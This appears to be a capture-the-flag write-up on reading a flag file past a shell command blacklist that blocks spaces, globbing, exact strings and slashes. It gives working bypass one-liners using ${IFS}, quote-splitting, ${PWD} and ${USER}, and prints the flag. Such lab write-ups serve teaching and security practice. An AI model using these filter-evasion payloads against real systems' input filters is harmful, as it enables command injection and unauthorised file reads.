### Goal is to retrieve the /home/user/flag file contents, while some extra restrictions are applied.

In this task, I could not use space (' '), and the shell globbing technique I used to bypass the blacklist to read the flag, like '?' and expansion '*'.

So I tried a different approach I did not use before. This blacklist matches the exact string, then blocks it, so as long as we dont just type the *EXACT* string, we can bypass it.


---

To bypass (' ') - space restriction we can use built in variable `${IFS}` which translates to literal space or new line.
Then we can use `'` or `"` to bypass exact string blacklisting. 

```bash
cat${IFS}/home/user/'fl'ag
```
```
CTF{who_needs_espace_when_u_have_bash_HASH : 88a00c92cc72005d116b9d61aa66b91a}
```

OR 

```bash
cat${IFS}/home/user/"fla"g
```
Thus, completing the task.

---

However, I did not want to stop here :D So I added an extra challenge here. What if '/' was also restricted? We can't just type /home/user/f'lag then.
This bypass is similar to ${IFS}, it's `{PWD}`. It prints the current working directory, for example, /home/user.

This would not do. But what if we are in the '/' root directory? `${PWD}` would just translate to literal '/', helping us bypass the extra restriction we added :)

```bash
cat${IFS}${PWD}home${PWD}${USER}${PWD}fl'ag'
```

CTF{who_needs_espace_when_u_have_bash_HASH : 88a00c92cc72005d116b9d61aa66b91a}


